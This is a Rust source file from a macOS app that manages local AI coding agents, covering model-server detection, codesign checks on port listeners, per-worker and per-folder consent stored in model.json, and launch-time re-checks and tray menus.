pub async fn check_listener_on(port: u16, requirement: &str) -> Result<(), Refused> {
    let refused = |note, why: String| Refused { note, why };
    let on = format!("-iTCP:{port}");
    // lsof exits 1 when it lists nothing.
    let (_, listed) = run_tool("/usr/sbin/lsof", &["-nP", &on, "-sTCP:LISTEN", "-Fp"])
        .await
        .map_err(|e| refused(UNCHECKED, e))?;
    let pids = lsof_pids(&listed);
    if pids.is_empty() {
        return Err(refused(
            NOT_YOURS,
            format!("no process of this user's listens on port {port} (another user's or the system's does)"),
        ));
    }
    let literal = format!("={requirement}");
    for pid in pids {
        let (signed, _) = run_tool("/usr/bin/codesign", &["--verify", "-R", &literal, &pid.to_string()])
            .await
            .map_err(|e| refused(UNCHECKED, e))?;
        if !signed {
            return Err(refused(
                NOT_SIGNED,
                format!(
                    "process {pid}, listening on port {port}, isn't signed by the app's maker (a Homebrew or Docker \
                     build isn't used)"
                ),
            ));
        }
    }
    Ok(())
}

/// How a start looks for the servers ([`detect_all`]; tests swap it).
pub type Detector = Arc<dyn Fn() -> Pin<Box<dyn Future<Output = Vec<Detected>> + Send>> + Send + Sync>;

fn real_detector() -> Detector {
    Arc::new(|| Box::pin(detect_all()))
}

/// A start on `model` may go ahead: its server lists it right now. The
/// `Err` is for the app log; the page gets [`LOCAL_DOWN`].
pub fn served(found: &[Detected], server: LocalServer, model: &str) -> Result<(), String> {
    match found.iter().find(|d| d.server == server) {
        Some(d) if d.serves(model) => Ok(()),
        Some(d) if d.running => Err(format!("{} no longer lists {model}", server.name())),
        _ => Err(format!("{} isn't running (the model is {model})", server.name())),
    }
}

/// The first executable `cli` on `path` (absolute entries only), as the
/// person's login shell would find it.
pub fn find_cli(path: &str, cli: &str) -> Option<PathBuf> {
    path.split(':')
        .filter(|d| d.starts_with('/'))
        .map(|d| Path::new(d).join(cli))
        .find(|p| is_executable(p))
}

/// A start or resume names the model mode the server recorded for its session
/// (`localModel`, from the claim). A job keeps that mode: if this Mac has
/// switched since (a job parked on the relay, then a local model chosen), it
/// is refused, never moved over silently, so the server's record (which
/// narrows the Native Intelligence tools for a local model) is always the mode it runs on.
/// Absent (an older web): this Mac's mode, as before.
pub fn check_mode(recorded: Option<bool>, model: &ModelChoice) -> Result<(), String> {
    match recorded {
        Some(false) if !model.is_relay() => Err(MODE_NOW_LOCAL.into()),
        Some(true) if model.is_relay() => Err(MODE_NOW_RELAY.into()),
        _ => Ok(()),
    }
}

/// A worker's session id, as the adapter accepts one from its agent: 1 to
/// [`MAX_WORKER_SESSION`] of `[A-Za-z0-9._:-]`, starting with a letter or a
/// digit (so never a flag). It travels in JSON only, never on a command line.
pub fn is_worker_session(id: &str) -> bool {
    let b = id.as_bytes();
    !b.is_empty()
        && b.len() <= MAX_WORKER_SESSION
        && b[0].is_ascii_alphanumeric()
        && b.iter().all(|c| c.is_ascii_alphanumeric() || b"._:-".contains(c))
}

/// A worker job resumes only on the session this Mac recorded for it, and
/// only if that is a worker session ([`is_worker_session`]). `asked` is the
/// server's id (`local_agent_start`'s `resume`), `recorded` Rust's own.
pub fn check_worker_resume(asked: Option<&str>, recorded: Option<&str>) -> Result<(), String> {
    if recorded.is_some_and(|r| !is_worker_session(r)) {
        return Err(BAD_SESSION.into());
    }
    match asked {
        Some(a) if !is_worker_session(a) || recorded != Some(a) => Err(FOREIGN_SESSION.into()),
        _ => Ok(()),
    }
}

/// A start naming a worker (by id) for a job that already runs on another
/// (or on eve). `label` names a recorded worker, when it is known.
pub fn check_same_worker(
    recorded: Option<&str>,
    asked: Option<&str>,
    label: impl Fn(&str) -> Option<String>,
) -> Result<(), String> {
    match asked {
        Some(w) if recorded != Some(w) => Err(match recorded {
            Some(r) => format!(
                "this job runs on {}",
                label(r).unwrap_or_else(|| "another coding agent".into())
            ),
            None => "this job runs on Native Intelligence's agent".into(),
        }),
        _ => Ok(()),
    }
}

/// The actor's check that the worker the handler looked up (`found`) is
/// still the job's (`id`: the one it keeps, else the one the start names).
/// Anything else changed in between: refused, never launched on a guess.
pub fn same_worker(id: Option<&str>, found: Option<Worker>) -> Result<Option<Worker>, String> {
    match (id, found) {
        (None, None) => Ok(None),
        (Some(id), Some(w)) if w.id == id => Ok(Some(w)),
        _ => Err(CHANGED.into()),
    }
}

/// One launch's worker: the bundle's adapter and agents' adapters, and the
/// person's CLI.
#[derive(Debug, Clone, PartialEq)]
pub struct WorkerRun {
    pub worker: Worker,
    pub adapter: PathBuf,
    /// [`WorkerFiles::acp_dir`], as `LOCAL_AGENT_ACP_DIR`.
    pub acp_dir: String,
    pub bin: String,
    /// The fence markers' folder, as `LOCAL_AGENT_FENCE_DIR`: filled in by
    /// the actor at launch, once it has made the markers ([`super::fence`]).
    pub fence_dir: String,
    /// Our own listeners' loopback ports at launch, as
    /// `LOCAL_AGENT_CLOSED_PORTS` (comma-separated, maybe empty), for the
    /// fence to deny: filled in by the actor ([`super::Actor::closed_ports`]).
    /// Ports opened later aren't in it; each listener's own secret is the
    /// first line.
    pub closed_ports: Vec<u16>,
    /// The workspace tools list this launch got from the server, as
    /// `LOCAL_AGENT_TOOLS_FILE` (board step 4, [`super::workspace_tools`]):
    /// filled in by the actor at launch; none, no variable.
    pub tools_file: Option<String>,
}

/// What a launch runs on beyond eve's defaults: the Mac's model choice and
/// the job's worker. Checked in the command handler, re-checked at launch.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct RunSpec {
    pub model: ModelChoice,
    pub worker: Option<WorkerRun>,
}

/// The relay's variables in [`super::config::launcher_env`].
const RELAY_URL: &str = "LOCAL_AGENT_MODEL_BASE_URL";
const RELAY_TOKEN: &str = "LOCAL_AGENT_MODEL_TOKEN";
const DEV_KEY: &str = "LOCAL_AGENT_DEV_ENV_FILE";

impl RunSpec {
    /// The script `<node>` runs: the worker's adapter, else eve's launcher.
    pub fn entry(&self, launch: &LaunchConfig) -> PathBuf {
        self.worker
            .as_ref()
            .map_or_else(|| launch.launcher.clone(), |w| w.adapter.clone())
    }

    /// Make [`super::config::launcher_env`]'s list this run's, failing
    /// closed: a local model gets no relay URL and no dev key (the session
    /// token stays, for C1's tool routes, with the app's origin); a worker
    /// gets none of the relay's variables, only its own five.
    pub fn apply(&self, env: &mut Vec<(String, String)>, launch: &LaunchConfig) {
        let closed = self.worker.as_ref().map_or_else(String::new, |w| {
            w.closed_ports.iter().map(u16::to_string).collect::<Vec<_>>().join(",")
        });
        let mut add: Vec<(&str, &str)> = Vec::new();
        match (&self.worker, &self.model) {
            (Some(w), _) => {
                env.retain(|(k, _)| ![RELAY_URL, RELAY_TOKEN, DEV_KEY].contains(&k.as_str()));
                add.push(("LOCAL_AGENT_WORKER", &w.worker.id));
                add.push(("LOCAL_AGENT_WORKER_BIN", &w.bin));
                add.push(("LOCAL_AGENT_ACP_DIR", &w.acp_dir));
                add.push(("LOCAL_AGENT_FENCE_DIR", &w.fence_dir));
                add.push(("LOCAL_AGENT_CLOSED_PORTS", closed.as_str()));
                if let Some(file) = &w.tools_file {
                    add.push(("LOCAL_AGENT_TOOLS_FILE", file));
                }
            }
            (None, ModelChoice::Local { server, model }) => {
                env.retain(|(k, _)| ![RELAY_URL, DEV_KEY].contains(&k.as_str()));
                let origin = launch
                    .model_base_url
                    .strip_suffix(MODEL_RELAY_PATH)
                    .unwrap_or(&launch.model_base_url);
                add.push(("LOCAL_AGENT_API_ORIGIN", origin));
                add.push(("LOCAL_AGENT_LOCAL_MODEL_BASE_URL", server.base_url()));
                add.push(("LOCAL_AGENT_LOCAL_MODEL_ID", model));
                add.push(("LOCAL_AGENT_LOCAL_MODEL_SERVER", server.as_str()));
            }
            (None, ModelChoice::Relay) => {}
        }
        env.extend(add.into_iter().map(|(k, v)| (k.to_string(), v.to_string())));
    }

    /// For the app log's "run" line.
    pub fn describe(&self, has_token: bool) -> String {
        match (&self.worker, &self.model) {
            (Some(w), _) => format!("{} at {}", w.worker.label, w.bin),
            (None, ModelChoice::Local { .. }) => format!("local model {}", self.model.label()),
            (None, ModelChoice::Relay) if has_token => "model relay".into(),
            (None, ModelChoice::Relay) => "dev model key".into(),
        }
    }
}

/// model.json: the choice and the workers' yes. Unknown values are kept as
/// they are, so a newer Native Intelligence's survive this one's saves.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct Stored {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    model: Option<Value>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    allowed_workers: Vec<String>,
    /// The folders the person said yes to, per worker
    /// (`{"worker": "<id>", "folder": "<realpath>"}`; [`remembered_yes`]).
    /// Raw JSON: an entry of another shape is kept as it is and grants
    /// nothing.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    worker_folders: Vec<Value>,
}

/// A well-formed remembered yes: (worker id, folder realpath). Anything else
/// in `workerFolders` (a hand edit, a newer build's entry) is none.
fn remembered_yes(entry: &Value) -> Option<(&str, &str)> {
    let worker = entry.get("worker")?.as_str()?;
    let folder = entry.get("folder")?.as_str()?;
    let path = Path::new(folder);
    // Absolute, and exactly as written: no `.`, `..`, doubled or trailing `/`.
    let plain = path.is_absolute()
        && !folder.contains('\0')
        && path
            .components()
            .all(|c| matches!(c, std::path::Component::RootDir | std::path::Component::Normal(_)))
        && path.components().collect::<PathBuf>().as_os_str() == path.as_os_str();
    (is_worker_id(worker) && plain).then_some((worker, folder))
}

impl Stored {
    /// Missing: nothing chosen. Unreadable: the choice can't be read
    /// (launches are refused until the person picks again) and no worker is
    /// allowed.
    fn load(path: &Path) -> Stored {
        match std::fs::read(path) {
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Stored::default(),
            Ok(bytes) => serde_json::from_slice(&bytes).unwrap_or_else(|e| {
                crate::log_to_file(&format!("[local-agent] {} does not parse ({e})", path.display()));
                Stored::unreadable()
            }),
            Err(e) => {
                crate::log_to_file(&format!("[local-agent] {} can't be read ({e})", path.display()));
                Stored::unreadable()
            }
        }
    }

    fn unreadable() -> Stored {
        Stored {
            model: Some(Value::String("unreadable".into())),
            allowed_workers: Vec::new(),
            worker_folders: Vec::new(),
        }
    }

    /// Atomically, owner-only.
    fn save(&self, path: &Path) -> std::io::Result<()> {
        let dir = path.parent().ok_or_else(|| std::io::Error::other("no parent"))?;
        create_private_dir(dir)?;
        let tmp = path.with_extension("json.tmp");
        {
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            #[cfg(unix)]
            {
                use std::os::unix::fs::OpenOptionsExt;
                opts.mode(0o600);
            }
            let mut f = opts.open(&tmp)?;
            f.write_all(&serde_json::to_vec_pretty(self).map_err(std::io::Error::other)?)?;
            f.sync_all()?;
        }
        std::fs::rename(&tmp, path)
    }

    fn allowed(&self, id: &str) -> bool {
        self.allowed_workers.iter().any(|w| w == id)
    }

    /// The person said yes to `worker` in `folder` (a realpath), exactly.
    fn remembers(&self, worker: &str, folder: &str) -> bool {
        self.worker_folders
            .iter()
            .filter_map(remembered_yes)
            .any(|(w, f)| w == worker && f == folder)
    }
}

/// What the watcher found: the bundle's capabilities, the servers (when the
/// bundle runs local models), its coding agents' registry (when the bundle
/// has everything a worker needs) and the ids of those whose CLI is on the
/// login shell's PATH (when it runs workers).
#[derive(Debug, Clone, Default, PartialEq)]
pub struct Found {
    pub caps: Caps,
    pub servers: Option<Vec<Detected>>,
    pub registry: Option<Registry>,
    pub clis: Vec<String>,
}

/// One line of the Coding Agents menu: a registry entry, or an id the
/// person allowed that this bundle's registry doesn't list (`label` none),
/// kept so the yes can be taken back.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorkerItem {
    pub id: String,
    pub label: Option<String>,
    pub allowed: bool,
}

/// A coding agent a start may name right now (`local_agent_status`'s
/// `workers`): in the bundle's registry, allowed on this Mac, its CLI found.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct WorkerOffer {
    pub id: String,
    pub label: String,
}

/// The actor's L4 state ([`Actor`]'s `l4`).
pub(super) struct L4 {
    stored: Stored,
    found: Found,
    /// Whether the watcher (or a start) has looked yet this app run.
    looked: bool,
    /// [`L4View`], recomputed when any of the above changes.
    view: L4View,
    /// Runs the command handler checked, for the launch to re-check.
    checked: HashMap<String, RunSpec>,
    detect: Detector,
}

impl Default for L4 {
    fn default() -> Self {
        L4 {
            stored: Stored::default(),
            found: Found::default(),
            looked: false,
            view: L4View::default(),
            checked: HashMap::new(),
            detect: real_detector(),
        }
    }
}

impl L4 {
    fn choice(&self) -> Result<ModelChoice, String> {
        ModelChoice::from_stored(self.stored.model.as_ref())
    }

    fn refresh_view(&mut self) {
        let choice = self.choice().ok();
        let chosen = match &choice {
            Some(ModelChoice::Local { server, model }) => Some((*server, model.clone())),
            _ => None,
        };
        let servers = self.looked.then(|| {
            self.found
                .servers
                .iter()
                .flatten()
                .map(|d| {
                    let mut models: Vec<String> = d.models.iter().take(MENU_MODELS).cloned().collect();
                    if let Some((_, m)) = chosen
                        .as_ref()
                        .filter(|(s, m)| *s == d.server && d.models.contains(m) && !models.contains(m))
                    {
                        models.push(m.clone());
                    }
                    Detected { models, ..d.clone() }
                })
                .collect()
        });
        // A registry entry installed on this Mac (and run by the bundle), or
        // one already allowed; then any other id allowed (the way back).
        let registry = self.found.registry.as_ref().map(Registry::workers).unwrap_or_default();
        let mut workers: Vec<WorkerItem> = registry
            .iter()
            .filter(|w| self.stored.allowed(&w.id) || (self.found.caps.workers && self.found.clis.contains(&w.id)))
            .map(|w| WorkerItem {
                id: w.id.clone(),
                label: Some(w.label.clone()),
                allowed: self.stored.allowed(&w.id),
            })
            .collect();
        for id in &self.stored.allowed_workers {
            if is_worker_id(id) && !workers.iter().any(|w| &w.id == id) {
                workers.push(WorkerItem {
                    id: id.clone(),
                    label: None,
                    allowed: true,
                });
            }
        }
        self.view = L4View {
            choice,
            servers,
            local_model: self.found.caps.local_model,
            workers,
        };
    }

    /// What a start may name right now, as far as Rust last looked: a
    /// bundle that runs workers, the relay chosen (a local model refuses
    /// them), and of its registry the agents allowed and installed. A start
    /// still checks it all again.
    fn offered(&self) -> Vec<WorkerOffer> {
        if !self.found.caps.workers || !self.choice().is_ok_and(|c| c.is_relay()) {
            return Vec::new();
        }
        self.found
            .registry
            .as_ref()
            .map(Registry::workers)
            .unwrap_or_default()
            .iter()
            .filter(|w| self.stored.allowed(&w.id) && self.found.clis.contains(&w.id))
            .map(|w| WorkerOffer {
                id: w.id.clone(),
                label: w.label.clone(),
            })
            .collect()
    }
}

/// What the tray draws for L4: the Model and Coding Agents submenus.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct L4View {
    /// `None`: model.json holds a choice this build can't read.
    pub choice: Option<ModelChoice>,
    /// What Rust last found, at most [`MENU_MODELS`] per server (plus the
    /// chosen one); `None`: it hasn't looked this run.
    pub servers: Option<Vec<Detected>>,
    /// The bundle runs local models.
    pub local_model: bool,
    /// The workers the tray offers, and whether each is allowed.
    pub workers: Vec<WorkerItem>,
}

impl Default for L4View {
    fn default() -> Self {
        Self {
            choice: Some(ModelChoice::Relay),
            servers: None,
            local_model: false,
            workers: Vec::new(),
        }
    }
}

/// One line of an L4 submenu.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum MenuLine {
    /// A check item; `id` is [`ModelChoice::menu_id`] or [`Worker::id`].
    Choice { id: String, label: String, checked: bool },
    /// Disabled text.
    Note(String),
    Separator,
}

fn short(s: &str, max: usize) -> String {
    let mut out: String = s.chars().take(max).collect();
    if s.chars().count() > max {
        out.push('…');
    }
    out
}

impl L4View {
    /// Draw the Model submenu only when it offers a choice: the bundle runs
    /// local models and a server on this Mac lists a chat model, or the
    /// choice isn't the relay (the way back to it). Otherwise there's
    /// nothing to pick, and the relay it is.
    pub fn model_shown(&self) -> bool {
        self.choice != Some(ModelChoice::Relay)
            || (self.local_model
                && self
                    .servers
                    .as_deref()
                    .is_some_and(|s| s.iter().any(|d| d.offers() || d.refused.is_some())))
    }

    /// The submenu's own title.
    pub fn model_title(&self) -> String {
        match &self.choice {
            None => "Model: Pick Again".into(),
            Some(ModelChoice::Relay) => "Model: Native Intelligence".into(),
            Some(ModelChoice::Local { model, .. }) => format!("Model: {}", short(model, TITLE_MODEL_MAX)),
        }
    }

    /// Native Intelligence, then each server that lists chat models, with them. The chosen
    /// model is always there, under its server (marked "Not Running" when it
    /// is down); a server with nothing to pick isn't.
    pub fn model_menu(&self) -> Vec<MenuLine> {
        let checked = |c: &ModelChoice| self.choice.as_ref() == Some(c);
        let mut lines = vec![MenuLine::Choice {
            id: ModelChoice::Relay.menu_id(),
            label: "Native Intelligence (Cloud)".into(),
            checked: checked(&ModelChoice::Relay),
        }];
        if self.choice.is_none() {
            lines.push(MenuLine::Note("Saved by a newer Native Intelligence: pick again".into()));
        }
        let chosen = match &self.choice {
            Some(ModelChoice::Local { server, model }) => Some((*server, model.as_str())),
            _ => None,
        };
        if chosen.is_some() && !self.local_model {
            lines.push(MenuLine::Note("This Build Can't Run a Local Model".into()));
        }
        let mut local: Vec<MenuLine> = Vec::new();
        for server in LocalServer::ALL {
            let found = self.servers.as_deref().and_then(|s| s.iter().find(|d| d.server == server));
            let mut models: Vec<&str> = found
                .filter(|d| d.running && self.local_model)
                .map(|d| d.models.iter().map(String::as_str).collect())
                .unwrap_or_default();
            if let Some((_, m)) = chosen.filter(|(s, m)| *s == server && !models.contains(m)) {
                models.insert(0, m);
            }
            // Something answers on its port that isn't used: say why.
            let refused = found.and_then(|d| d.refused).filter(|_| self.local_model);
            if models.is_empty() {
                if let Some(note) = refused {
                    local.push(MenuLine::Note(format!("{}: Not Used ({note})", server.name())));
                }
                continue;
            }
            local.push(MenuLine::Note(match (refused, found.is_some_and(|d| !d.running)) {
                (Some(note), _) => format!("{}: Not Used ({note})", server.name()),
                (None, true) => format!("{}: Not Running", server.name()),
                (None, false) => format!("{} on This Mac", server.name()),
            }));
            for m in models {
                let c = ModelChoice::Local {
                    server,
                    model: m.to_string(),
                };
                local.push(MenuLine::Choice {
                    id: c.menu_id(),
                    label: short(m, 60),
                    checked: checked(&c),
                });
            }
        }
        if !local.is_empty() {
            lines.push(MenuLine::Separator);
            lines.extend(local);
        }
        lines
    }

    /// The Coding Agents submenu: a worker installed on this Mac (and run by
    /// the bundle), or one already allowed (the way to take it back).
    pub fn workers_shown(&self) -> bool {
        !self.workers.is_empty()
    }

    pub fn workers_menu(&self) -> Vec<MenuLine> {
        self.workers
            .iter()
            .map(|w| MenuLine::Choice {
                id: w.id.clone(),
                label: match &w.label {
                    Some(label) => allow_label(label),
                    None => format!("Allow {} (not in this build)", w.id),
                },
                checked: w.allowed,
            })
            .collect()
    }

    /// Whether the tray shows `id` as allowed.
    pub fn worker_allowed(&self, id: &str) -> bool {
        self.workers.iter().any(|w| w.id == id && w.allowed)
    }
}

/// What the command handler needs from the actor before a start or resume.
pub(super) struct Precheck {
    /// The job runs (or is starting): the start is a no-op, the resume an
    /// error, and nothing is checked.
    live: bool,
    choice: Result<ModelChoice, String>,
    /// Rust has a record of the job, and of its worker if it has one.
    exists: bool,
    recorded: Option<String>,
    /// The job's session as this Mac recorded it.
    session: Option<String>,
    /// The ids the person allowed.
    allowed: Vec<String>,
    detect: Detector,
}

/// The actor's part (`Cmd::Workers`).
pub(super) enum Cmd {
    #[cfg(test)]
    View {
        reply: oneshot::Sender<L4View>,
    },
    /// The choice, for `local_agent_status`.
    Choice {
        reply: oneshot::Sender<Result<ModelChoice, String>>,
    },
    /// The tray's Model menu.
    Set {
        choice: ModelChoice,
        reply: Reply<()>,
    },
    /// The tray's Coding Agents menu, by id.
    Allow {
        worker: String,
        allowed: bool,
        reply: Reply<()>,
    },
    /// What a start may name, for `local_agent_status`.
    Offered {
        reply: oneshot::Sender<Vec<WorkerOffer>>,
    },
    /// The watcher looked.
    Found(Found),
    /// The watcher read the bundle's registry, before its first look (the
    /// tray names the allowed workers by it).
    Registry(Option<Registry>),
    /// A start looked at the servers.
    Servers(Vec<Detected>),
    /// [`watch`]: look now? A folder is shared and local agents are on.
    Watching {
        reply: oneshot::Sender<bool>,
    },
    Precheck {
        job_id: Option<String>,
        reply: oneshot::Sender<Precheck>,
    },
    /// The handler's checked run for `job_id`'s launch.
    Checked {
        job_id: String,
        run: RunSpec,
    },
}

impl Actor {
    pub(super) fn on_workers(&mut self, cmd: Cmd) {
        match cmd {
            #[cfg(test)]
            Cmd::View { reply } => {
                let _ = reply.send(self.l4.view.clone());
            }
            Cmd::Choice { reply } => {
                let _ = reply.send(self.l4.choice());
            }
            Cmd::Set { choice, reply } => {
                let _ = reply.send(self.set_model(choice));
            }
            Cmd::Allow { worker, allowed, reply } => {
                let _ = reply.send(self.allow_worker(&worker, allowed));
            }
            Cmd::Offered { reply } => {
                let _ = reply.send(self.l4.offered());
            }
            Cmd::Registry(registry) => {
                if !self.l4.looked {
                    self.l4.found.registry = registry;
                    self.l4.refresh_view();
                }
            }
            Cmd::Found(found) => {
                self.log_servers(found.servers.as_deref());
                self.l4.found = found;
                self.l4.looked = true;
                self.l4.refresh_view();
            }
            Cmd::Servers(servers) => {
                self.log_servers(Some(&servers));
                self.l4.found.servers = Some(servers);
                self.l4.looked = true;
                self.l4.refresh_view();
            }
            Cmd::Watching { reply } => {
                let _ = reply.send(self.enabled && !self.closing && !self.state.off && !self.state.grants.is_empty());
            }
            Cmd::Precheck { job_id, reply } => {
                let job = job_id.as_deref().and_then(|id| self.state.job(id));
                let live = job_id
                    .as_deref()
                    .is_some_and(|id| self.live.contains_key(id) || self.preparing.contains_key(id));
                if let Some(id) = &job_id {
                    // Only this check's result may reach the launch.
                    self.l4.checked.remove(id);
                }
                let _ = reply.send(Precheck {
                    live,
                    choice: self.l4.choice(),
                    exists: job.is_some(),
                    recorded: job.and_then(|j| j.worker.clone()),
                    session: job.and_then(|j| j.session_id.clone()),
                    allowed: self.l4.stored.allowed_workers.clone(),
                    detect: self.l4.detect.clone(),
                });
            }
            Cmd::Checked { job_id, run } => {
                self.l4.checked.insert(job_id, run);
            }
        }
    }

    /// Read model.json (part of [`Actor::load`]).
    pub(super) fn load_l4(&mut self) {
        self.l4.stored = Stored::load(&self.paths.root.join(STORE_FILE));
        self.l4.refresh_view();
    }

    pub(super) fn l4_view(&self) -> L4View {
        self.l4.view.clone()
    }

    /// Record `session_id` for `job_id`? Not for a worker job unless it is a
    /// worker session ([`is_worker_session`]): only such an id is ever sent
    /// back to a worker's adapter.
    pub(super) fn accepts_session(&self, job_id: &str, session_id: &str) -> bool {
        let worker = self.state.job(job_id).is_some_and(|j| j.worker.is_some());
        if worker && !is_worker_session(session_id) {
            crate::log_to_file(&format!(
                "[local-agent:{job_id}] ignoring a worker session id outside [A-Za-z0-9._:-] (1 to 256)"
            ));
            return false;
        }
        true
    }

    /// The person said yes to `worker` in the folder shared as `grant_path`
    /// ([`starts`](super::starts)), and that is still that folder: its
    /// realpath now is the grant's path (a folder replaced by a link to
    /// somewhere else isn't), and the worker is switched on.
    pub(super) fn worker_remembered(&self, worker: &str, grant_path: &str) -> bool {
        self.l4.stored.allowed(worker)
            && yes_folder(grant_path).is_some_and(|f| self.l4.stored.remembers(worker, &f))
    }

    /// Remember the person's yes to `worker` in the folder shared as
    /// `grant_path` (its realpath now, if that is still the grant's path), in
    /// model.json: written by Rust only, never sent to or read from the page.
    pub(super) fn remember_worker_folder(&mut self, worker: &str, grant_path: &str) {
        // Only while it is switched on: a yes clicked after the person
        // switched it off (its folders forgotten) must not bring one back.
        if !self.l4.stored.allowed(worker) {
            crate::log_to_file(&format!("[local-agent] not remembering a yes for {worker}: it is switched off"));
            return;
        }
        let Some(folder) = yes_folder(grant_path).filter(|_| is_worker_id(worker)) else {
            crate::log_to_file(&format!("[local-agent] not remembering a yes for {worker}: {grant_path} isn't that folder now"));
            return;
        };
        if self.l4.stored.remembers(worker, &folder) {
            return;
        }
        let mut stored = self.l4.stored.clone();
        stored
            .worker_folders
            .push(serde_json::json!({ "worker": worker, "folder": folder }));
        if let Err(e) = self.save_l4(stored) {
            crate::log_to_file(&format!("[local-agent] the yes for {worker} in {folder} isn't remembered: {e}"));
        }
    }

    /// The app log says what was found, when it changes.
    fn log_servers(&self, servers: Option<&[Detected]>) {
        let offered = |s: Option<&[Detected]>| -> Vec<String> {
            s.unwrap_or_default()
                .iter()
                .filter(|d| d.offers())
                .map(|d| format!("{} ({} models)", d.server.name(), d.models.len()))
                .collect()
        };
        let now = offered(servers);
        if offered(self.l4.found.servers.as_deref()) != now {
            crate::log_to_file(&format!(
                "[local-agent] model servers on this Mac: {}",
                if now.is_empty() { "none".into() } else { now.join(", ") }
            ));
        }
    }

    fn save_l4(&mut self, stored: Stored) -> Result<(), String> {
        if self.enabled {
            stored
                .save(&self.paths.root.join(STORE_FILE))
                .map_err(|e| format!("couldn't save the choice: {e}"))?;
        }
        self.l4.stored = stored;
        self.l4.refresh_view();
        Ok(())
    }

    /// Only a model a server on this Mac listed when Rust last looked, and
    /// only on a bundle that runs local models. A switch from the relay to a
    /// local model stops (or parks, when idle) every job still on the relay
    /// or a worker: from then on, nothing of this Mac's may leave it that way.
    fn set_model(&mut self, choice: ModelChoice) -> Result<(), String> {
        if !self.enabled {
            return Err("unavailable in this build".into());
        }
        if let ModelChoice::Local { server, model } = &choice {
            check_model_id(model)?;
            if !self.l4.found.caps.local_model {
                return Err(NO_LOCAL_SUPPORT.into());
            }
            let listed = self
                .l4
                .found
                .servers
                .iter()
                .flatten()
                .any(|d| d.server == *server && d.serves(model));
            if !listed {
                return Err(format!("{} on this Mac doesn't list {model}", server.name()));
            }
        }
        let was = self.l4.choice();
        let stored = Stored {
            model: choice.to_stored(),
            ..self.l4.stored.clone()
        };
        if stored == self.l4.stored {
            return Ok(());
        }
        self.save_l4(stored)?;
        crate::log_to_file(&format!(
            "[local-agent] this Mac's local agents now use {}, from their next launch",
            choice.label()
        ));
        if !choice.is_relay() && was.map_or(true, |w| w.is_relay()) {
            self.stop_jobs_where("this Mac switched to a local model", |_| true);
        }
        Ok(())
    }

    /// The tray's Coding Agents menu, by id. A yes needs a bundle that runs
    /// workers and lists this one in its registry; taking it back (any id)
    /// stops (or parks) that worker's jobs.
    fn allow_worker(&mut self, id: &str, allowed: bool) -> Result<(), String> {
        if !self.enabled {
            return Err("unavailable in this build".into());
        }
        check_worker_id(id)?;
        let listed = self.l4.found.registry.as_ref().and_then(|r| r.get(id)).cloned();
        if allowed && (!self.l4.found.caps.workers || listed.is_none()) {
            return Err(NO_WORKERS.into());
        }
        let name = listed.map_or_else(|| id.to_string(), |w| w.label);
        let mut stored = self.l4.stored.clone();
        stored.allowed_workers.retain(|w| w != id);
        if allowed {
            stored.allowed_workers.push(id.to_string());
        } else {
            // Switched off: every folder it had a yes for is forgotten, so
            // switching it on again asks afresh.
            stored
                .worker_folders
                .retain(|e| e.get("worker").and_then(Value::as_str) != Some(id));
        }
        if stored == self.l4.stored {
            return Ok(());
        }
        if let Err(e) = self.save_l4(stored.clone()) {
            if allowed {
                return Err(e);
            }
            // Off holds for this run of the app even when it can't be saved
            // (a full disk): never leave the agent on against the click.
            crate::log_to_file(&format!(
                "[local-agent] {name} is off for now, but that couldn't be saved ({e}): it may be on again after a relaunch"
            ));
            self.l4.stored = stored;
            self.l4.refresh_view();
        }
        crate::log_to_file(&format!(
            "[local-agent] {name} is {} on this Mac",
            if allowed { "allowed" } else { "no longer allowed" }
        ));
        if !allowed {
            self.stop_jobs_where(&format!("{name} is no longer allowed"), |j| j.worker.as_deref() == Some(id));
        }
        Ok(())
    }

    /// Park the idle jobs that match and stop the others (cancelled,
    /// resumable). Starts still being prepared are left alone: their launch
    /// re-checks the choice and the yes ([`Actor::run_spec`]) and refuses
    /// only what changed.
    fn stop_jobs_where(&mut self, why: &str, pred: impl Fn(&Job) -> bool) {
        let now = tokio::time::Instant::now();
        let mut park = Vec::new();
        let mut stop = Vec::new();
        for (id, live) in &self.live {
            if live.stop.is_some() || !self.state.job(id).is_some_and(&pred) {
                continue;
            }
            if self.idle_since(id, live, now).is_some() {
                park.push(id.clone());
            } else {
                stop.push(id.clone());
            }
        }
        if !park.is_empty() || !stop.is_empty() {
            crate::log_to_file(&format!(
                "[local-agent] {why}: parking {} job(s), stopping {}",
                park.len(),
                stop.len()
            ));
        }
        for id in park {
            self.park(&id, why);
        }
        for id in stop {
            let _ = self.stop(&id);
        }
    }

    /// The run the handler checked for `job_id`, re-checked against this
    /// moment's choice and yes (they may have changed since).
    pub(super) fn run_spec(&mut self, job_id: &str) -> Result<RunSpec, String> {
        let run = self.l4.checked.remove(job_id).ok_or(CHANGED)?;
        if self.l4.choice()? != run.model {
            return Err(CHANGED.into());
        }
        let recorded = self.state.job(job_id).and_then(|j| j.worker.clone());
        if recorded.as_deref() != run.worker.as_ref().map(|w| w.worker.id.as_str()) {
            return Err(CHANGED.into());
        }
        if let Some(w) = &run.worker {
            if !self.l4.stored.allowed(&w.worker.id) || !run.model.is_relay() {
                return Err(CHANGED.into());
            }
        }
        Ok(run)
    }
}

impl LocalAgentService {
    #[cfg(test)]
    pub(super) async fn models(&self) -> Result<L4View, String> {
        self.ask(|reply| super::Cmd::Workers(Cmd::View { reply })).await
    }

    /// `local_agent_status`'s `localModel`: this Mac's choice is a local model
    /// and the bundle at `agent_dir` runs it, so jobs think on this Mac. Only
    /// that: the page never learns which model or server.
    pub(super) async fn uses_local_model(&self, agent_dir: Option<&Path>) -> bool {
        let Ok(Ok(choice)) = self.ask(|reply| super::Cmd::Workers(Cmd::Choice { reply })).await else {
            return false;
        };
        !choice.is_relay() && agent_dir.is_some_and(|d| bundle_caps(d).local_model)
    }

    /// The tray's Model menu (native only: no command calls it).
